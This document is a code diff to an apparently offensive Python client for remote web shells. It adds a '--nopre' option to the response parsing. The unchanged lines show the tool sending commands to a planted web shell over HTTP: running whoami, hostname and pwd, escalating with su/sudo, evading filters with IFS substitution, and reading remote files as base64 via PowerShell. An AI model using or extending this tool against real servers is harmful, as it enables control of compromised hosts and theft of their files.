@@ -47,6 +47,7 @@ parser.add_argument("method", help="HTTP Method to execute command (GET or POST)
 parser.add_argument("-a", "--auth", help="Authorization header to use on each request", type=str)
 parser.add_argument("-c", "--cookies", help="Cookie header to use on each request", type=str)
 parser.add_argument("-p", "--param", default="code", help="Parameter to use with custom WebShell", type=str)
+parser.add_argument("-np", "--nopre", action="store_true", help="Disable HTML <pre> tags parser")
 parser.add_argument("-pi", "--pipe", action="store_true", help="Pipe all commands after parameter")
 parser.add_argument("-ifs", "--ifs", action="store_true", help="Replace all white spaces with Internal Field Separator")
 parser.add_argument("-su", "--sudo", action="store_true", help="Sudo command execution (Only on Linux hosts)")
@@ -66,6 +67,8 @@ try:
    if args.pipe:
       PIPE = "|"
    whoami = send_command(PIPE + "whoami", WEBSHELL, HTTP_METHOD, PARAM)
+   if args.nopre:
+      whoami = "<pre>" + whoami + "</pre>"
    if not "<pre>" in whoami:
       print (colored("[!] Command output not found! Exiting..\n", "red"))
       sys.exit()                      
@@ -75,18 +78,24 @@ try:
    if args.sudo:
       whoami = "root"
    hostname = send_command(PIPE + "hostname", WEBSHELL, HTTP_METHOD, PARAM)
+   if args.nopre:
+      hostname = "<pre>" + hostname + "</pre>"
    if "<pre>" in hostname:
       hostname = str(hostname).split("<pre>", 1)[1] ; hostname = str(hostname).split("</pre>", 1)[0]
       hostname = remove_html(hostname)
    cwd = "" ; slash = "\\"
    if not slash in whoami:
       path = send_command(PIPE + "pwd", WEBSHELL, HTTP_METHOD, PARAM)
+      if args.nopre:
+         path = "<pre>" + path + "</pre>"
       if "<pre>" in path:
          path = str(path).split("<pre>", 1)[1] ; path = str(path).split("</pre>", 1)[0]
          path = remove_html(path)
       system = "linux" ; slash = "/"
    else:
       path = send_command(PIPE + "(pwd).path", WEBSHELL, HTTP_METHOD, PARAM)
+      if args.nopre:
+         path = "<pre>" + path + "</pre>"
       if "<pre>" in path:
          path = str(path).split("<pre>", 1)[1] ; path = str(path).split("</pre>", 1)[0]
          path = remove_html(path)
@@ -180,6 +189,8 @@ try:
                      if system == "windows":
                          command = "[Convert]::ToBase64String([IO.File]::ReadAllBytes('"+remotefile+"'))" 
                          base64data = send_command(PIPE + command, WEBSHELL, HTTP_METHOD, PARAM)
+                     if args.nopre:
+                        base64data = "<pre>" + base64data + "</pre>"
                      if "<pre>" in base64data:
                         base64data = str(base64data).split("<pre>", 1)[1] ; base64data = str(base64data).split("</pre>", 1)[0]
                         base64data = remove_html(base64data)
@@ -228,6 +239,8 @@ try:
                            if not slash in relative_path:
                               command = cmd + space + param + path.rstrip() + slash + relative_path
                            content = send_command(PIPE + command, WEBSHELL, HTTP_METHOD, PARAM)
+                           if args.nopre:
+                              content = "<pre>" + content + "</pre>"
                            if "<pre>" in content:
                               content = str(content).split("<pre>", 1)[1] ; content = str(content).split("</pre>", 1)[0]
                               content = remove_html(content) + "\n"
@@ -235,6 +248,8 @@ try:
                         else:
                            if args.PowerShell:
                               content = send_command(PIPE + "powershell " + command, WEBSHELL, HTTP_METHOD, PARAM)
+                              if args.nopre:
+                                 content = "<pre>" + content + "</pre>"
                               if "<pre>" in content:
                                  content = str(content).split("<pre>", 1)[1] ; content = str(content).split("</pre>", 1)[0]
                                  content = remove_html(content) + "\n"
@@ -242,12 +257,16 @@ try:
                            else:
                               if args.sudo:
                                  content = send_command(PIPE + "su" + space + "-c" + space + command, WEBSHELL, HTTP_METHOD, PARAM)
+                                 if args.nopre:
+                                    content = "<pre>" + content + "</pre>"
                                  if "<pre>" in content:
                                      content = str(content).split("<pre>", 1)[1] ; content = str(content).split("</pre>", 1)[0]
                                      content = remove_html(content) + "\n"
                                  print (colored(content, "yellow")) 
                               else:
                                  content = send_command(PIPE + command, WEBSHELL, HTTP_METHOD, PARAM)
+                                 if args.nopre:
+                                    content = "<pre>" + content + "</pre>"
                                  if "<pre>" in content:
                                      content = str(content).split("<pre>", 1)[1] ; content = str(content).split("</pre>", 1)[0]
                                      content = remove_html(content) + "\n"
